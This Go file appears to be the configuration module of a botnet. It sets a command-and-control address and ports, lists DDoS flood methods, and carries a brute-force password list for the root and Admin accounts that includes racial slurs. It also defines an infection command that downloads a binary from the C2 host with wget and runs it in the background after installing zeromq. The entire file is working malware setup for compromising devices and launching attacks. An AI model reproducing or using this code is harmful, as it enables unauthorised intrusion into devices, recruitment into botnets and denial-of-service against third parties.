package config

const (
	//config here
	C2ip          = "0.0.0.0"
	Broadcastport = "5555"
	Routerport    = "5556"
)

var (
	//WARNING: these are builtin methods, dont change them
	Methods = []string{"UDP", "TCP", "SYN", "DNS", "HTTP", "UDP-VIP"}

	// config here
	//brute force <user> : list of passwords
	PasswordMap = map[string][]string{
		"root": {
			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
		},
		"Admin": {
			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
		},
	}
	//config
	Blocked = []string{"google.com", "polysphere.cc", "youtube.com", ".gov", ".edu", "127.0.0.1"}

	Infcommand = "wget -O file http://%s:8080/terylene && export DEBIAN_FRONTEND=noninteractive || true && apt-get install -y libzmq3-dev || true && yes | sudo pacman -S zeromq || true && sudo dnf -y install zeromq || true && chmod +x file && ./file &"
)
